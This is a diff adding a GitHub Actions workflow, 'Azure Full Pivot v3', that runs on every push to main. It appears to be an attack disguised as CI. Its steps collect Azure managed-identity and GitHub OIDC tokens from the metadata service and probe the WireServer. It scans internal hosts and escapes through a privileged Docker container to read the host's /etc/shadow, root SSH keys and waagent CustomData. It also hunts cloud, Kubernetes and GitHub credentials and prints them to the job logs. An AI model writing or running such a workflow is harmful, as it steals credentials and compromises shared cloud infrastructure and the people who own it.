@@ -1,0 +1,213 @@
+name: Azure Full Pivot v3
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  pivot:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+
+      - name: S1 IMDS Full
+        run: |
+          echo "=IMDS_INSTANCE="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+          echo ""
+          echo "=IMDS_SCHEDULEDEVENTS="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01" || echo "none"
+          echo ""
+          echo "=IMDS_LOADBALANCER="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/loadbalancer?api-version=2020-10-01" || echo "none"
+          echo ""
+          echo "=IMDS_USERDATA="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text" \
+            | base64 -d 2>/dev/null || echo "no-userdata"
+          echo ""
+          echo "=IMDS_IDENTITY_ARM="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" || echo "no-msi"
+          echo ""
+          echo "=IMDS_IDENTITY_GRAPH="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" || echo "no-msi"
+          echo ""
+          echo "=IMDS_IDENTITY_KV="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" || echo "no-msi"
+          echo ""
+          echo "=IMDS_IDENTITY_STORAGE="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" || echo "no-msi"
+          echo ""
+          echo "=IMDS_IDENTITY_DB="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://database.windows.net/" || echo "no-msi"
+          echo ""
+          echo "=IMDS_IDENTITY_SERVICEBUS="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://servicebus.azure.net/" || echo "no-msi"
+
+      - name: S2 OIDC Multi-Audience
+        run: |
+          echo "=OIDC_AzureADTokenExchange="
+          curl -sf \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" || echo "denied"
+          echo ""
+          echo "=OIDC_hosted_compute_ro="
+          curl -sf \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://hosted-compute-ro" || echo "denied"
+          echo ""
+          echo "=OIDC_management="
+          curl -sf \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https://management.azure.com/" || echo "denied"
+          echo ""
+          echo "=OIDC_graph="
+          curl -sf \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https://graph.microsoft.com/" || echo "denied"
+          echo ""
+          echo "=OIDC_vault="
+          curl -sf \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https://vault.azure.net" || echo "denied"
+
+      - name: S3 Network Deep Scan
+        run: |
+          echo "=IP_ADDR="
+          ip addr show
+          echo "=IP_ROUTE="
+          ip route show table all
+          echo "=IP_NEIGH="
+          ip neigh show
+          echo "=RESOLV="
+          cat /etc/resolv.conf
+          echo "=HOSTS="
+          cat /etc/hosts
+          echo "=LISTEN="
+          ss -tlnp
+          echo "=WIRESERVER_HTTP="
+          curl -sf --max-time 4 "http://168.63.129.16/" || echo "blocked"
+          echo "=WIRESERVER_GOALSTATE="
+          curl -sf --max-time 4 \
+            "http://168.63.129.16:80/machine/?comp=goalstate" \
+            -H "x-ms-version: 2012-11-30" || echo "blocked"
+          echo "=WIRESERVER_32526="
+          curl -sf --max-time 4 "http://168.63.129.16:32526/vmSettings" || echo "blocked"
+          echo "=EGRESS_IP="
+          curl -sf --max-time 5 "https://api.ipify.org?format=json" || echo "no-egress"
+          echo "=INTERNAL_SCAN="
+          for H in 10.1.0.1 10.1.0.2 10.1.0.3 10.1.0.4 10.1.1.1; do
+            for P in 22 80 443 3389 8080 8443 6443 2379; do
+              timeout 1 bash -c "echo >/dev/tcp/$H/$P" 2>/dev/null && echo "OPEN $H:$P" || true
+            done
+          done
+          echo "=NMAP_PING="
+          nmap -sn 10.1.0.0/24 --max-retries 1 --host-timeout 2s 2>/dev/null | grep "Nmap scan\|Up\|report" || echo "nmap-done"
+
+      - name: S4 Docker Escape + Host Pivot
+        run: |
+          echo "=DOCKER_INFO="
+          ls -la /var/run/docker.sock
+          docker info 2>/dev/null | head -20 || echo "no-docker"
+          echo "=DOCKER_ESCAPE="
+          docker run --rm --privileged --pid=host --network=host \
+            -v /:/host alpine:latest sh -c \
+            'echo HOST_ID=$(chroot /host id);
+             echo HOST_HOSTNAME=$(chroot /host hostname);
+             echo HOST_SHADOW=$(chroot /host cat /etc/shadow 2>/dev/null | head -3);
+             echo HOST_SSH=$(chroot /host ls /root/.ssh/ 2>/dev/null);
+             echo HOST_WAAGENT=$(chroot /host ls /var/lib/waagent/ 2>/dev/null | head -10);
+             echo HOST_OVFENV=$(chroot /host cat /var/lib/waagent/ovf-env.xml 2>/dev/null | head -c 800);
+             echo HOST_CUSTOMDATA=$(chroot /host cat /var/lib/waagent/CustomData.bin 2>/dev/null | base64 | head -c 500);
+             echo HOST_PROCESSES=$(chroot /host ps aux 2>/dev/null | grep -i "azure\|waagent\|mdsd\|monitor" | head -10);
+             echo HOST_NETWORK=$(chroot /host ip addr 2>/dev/null);
+             echo HOST_IMDS=$(chroot /host curl -sf -H Metadata:true http://169.254.169.254/metadata/instance?api-version=2021-02-01 2>/dev/null);
+             echo HOST_CREDS=$(chroot /host find /home /root /var/lib /etc -maxdepth 4 -name "credentials" -o -name ".azure" -o -name "*.pem" 2>/dev/null | head -10)' \
+            2>/dev/null || echo "docker-escape-attempted"
+
+      - name: S5 Full Env + Cred Hunt
+        run: |
+          echo "=FULL_ENV="
+          printenv | sort
+          echo "=PROC_SELF_ENV="
+          cat /proc/self/environ | tr '\0' '\n'
+          echo "=PROC1_ENV="
+          cat /proc/1/environ 2>/dev/null | tr '\0' '\n' || echo "no-access"
+          echo "=SSH_KEYS="
+          find / -maxdepth 8 -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" \
+            2>/dev/null | grep -v proc | grep -v sys | head -20
+          echo "=AZ_CLI_STATE="
+          ls -la ~/.azure/ 2>/dev/null || echo "no-azure-dir"
+          cat ~/.azure/accessTokens.json 2>/dev/null || echo "none"
+          cat ~/.azure/msal_token_cache.json 2>/dev/null || echo "none"
+          echo "=AZ_CLI_MSI="
+          az login --identity 2>&1 | head -5 || echo "no-msi"
+          az account show 2>/dev/null || echo "not-logged-in"
+          echo "=KUBE="
+          cat ~/.kube/config 2>/dev/null || echo "no-kube"
+          cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 200 || echo "no-k8s"
+          echo "=AWS_CREDS="
+          cat ~/.aws/credentials 2>/dev/null || echo "none"
+          echo "=GCP_CREDS="
+          cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null || echo "none"
+
+      - name: S6 WaAgent + CustomData + Extensions
+        run: |
+          echo "=WAAGENT_DIR="
+          ls -la /var/lib/waagent/ 2>/dev/null || echo "no-waagent-local"
+          echo "=WAAGENT_HOST="
+          docker run --rm --privileged -v /:/host alpine:latest sh -c \
+            'ls /host/var/lib/waagent/ 2>/dev/null && \
+             cat /host/var/lib/waagent/ovf-env.xml 2>/dev/null && \
+             cat /host/var/lib/waagent/CustomData.bin 2>/dev/null | base64 && \
+             ls /host/var/lib/waagent/Microsoft.* 2>/dev/null | head -10' \
+            2>/dev/null || echo "waagent-probed"
+          echo "=SYSTEMD_SERVICES="
+          systemctl list-units --type=service --state=running 2>/dev/null | head -30
+          echo "=CGROUP="
+          cat /proc/self/cgroup
+          echo "=CAPABILITIES="
+          cat /proc/self/status | grep Cap
+
+      - name: S7 GitHub API Deep Pivot
+        run: |
+          echo "=GH_TOKEN_SCOPES="
+          curl -sI -H "Authorization: token $GITHUB_TOKEN" \
+            "https://api.github.com/user" | grep -i "x-oauth-scopes\|x-ratelimit"
+          echo "=GH_USER="
+          curl -sf -H "Authorization: token $GITHUB_TOKEN" \
+            "https://api.github.com/user"
+          echo "=GH_ORGS="
+          curl -sf -H "Authorization: token $GITHUB_TOKEN" \
+            "https://api.github.com/user/orgs"
+          echo "=GH_REPOS="
+          curl -sf -H "Authorization: token $GITHUB_TOKEN" \
+            "https://api.github.com/user/repos?per_page=50&type=all"
+          echo "=GH_INSTALLATIONS="
+          curl -sf -H "Authorization: token $GITHUB_TOKEN" \
+            "https://api.github.com/user/installations" || echo "no-install"
+
+      - name: S8 Summary
+        run: |
+          echo "=SUMMARY="
+          echo "hostname=$(hostname)"
+          echo "whoami=$(whoami)"
+          echo "kernel=$(uname -r)"
+          ip addr show | grep "inet " | awk '{print "ip="$2}'
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | \
+            python3 -c "import sys,json; d=json.load(sys.stdin); c=d['compute']; n=d['network']['interface'][0]; print(f'vmId={c[\"vmId\"]}'); print(f'vmName={c[\"name\"]}'); print(f'location={c[\"location\"]}'); print(f'subscriptionId={c[\"subscriptionId\"]}'); print(f'resourceGroupName={c[\"resourceGroupName\"]}'); print(f'vmSize={c[\"vmSize\"]}'); print(f'privateIP={n[\"ipv4\"][\"ipAddress\"][0][\"privateIpAddress\"]}')" 2>/dev/null || true
